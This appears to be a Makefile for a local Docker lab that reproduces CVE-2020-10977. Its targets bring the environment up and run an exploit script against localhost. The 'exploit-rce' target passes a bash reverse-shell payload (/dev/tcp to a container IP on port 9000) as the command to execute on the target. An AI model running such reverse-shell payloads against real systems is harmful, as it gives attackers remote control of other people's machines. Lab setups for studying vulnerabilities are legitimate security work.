.PHONY: clean
clean:
	@sudo rm -rfv .cache

.PHONY: prepare
prepare:
	@mkdir -p .cache/config .cache/logs .cache/data

.PHONY: up
up: prepare
	docker-compose up

.PHONY: down
down:
	docker-compose down

.PHONY: shell
shell:
	docker-compose exec shell bash

.PHONY: exploit
exploit:
	./cve_2020_10977.py --url http://localhost:5580 -u yolo -p password


.PHONY: exploit-rce
exploit-rce:
	$(eval IP_ADDR := $(shell docker-compose exec shell ip addr show eth0 | awk '$$1 == "inet" {gsub(/\/.*$$/, "", $$2); print $$2}' | tr -d '[:space:]'))
	
	./cve_2020_10977.py \
		--url http://localhost:5580 \
		-u yolo \
		-p password \
		--cmd "bash -c 'bash -i >& /dev/tcp/$(IP_ADDR)/9000 0>&1'"
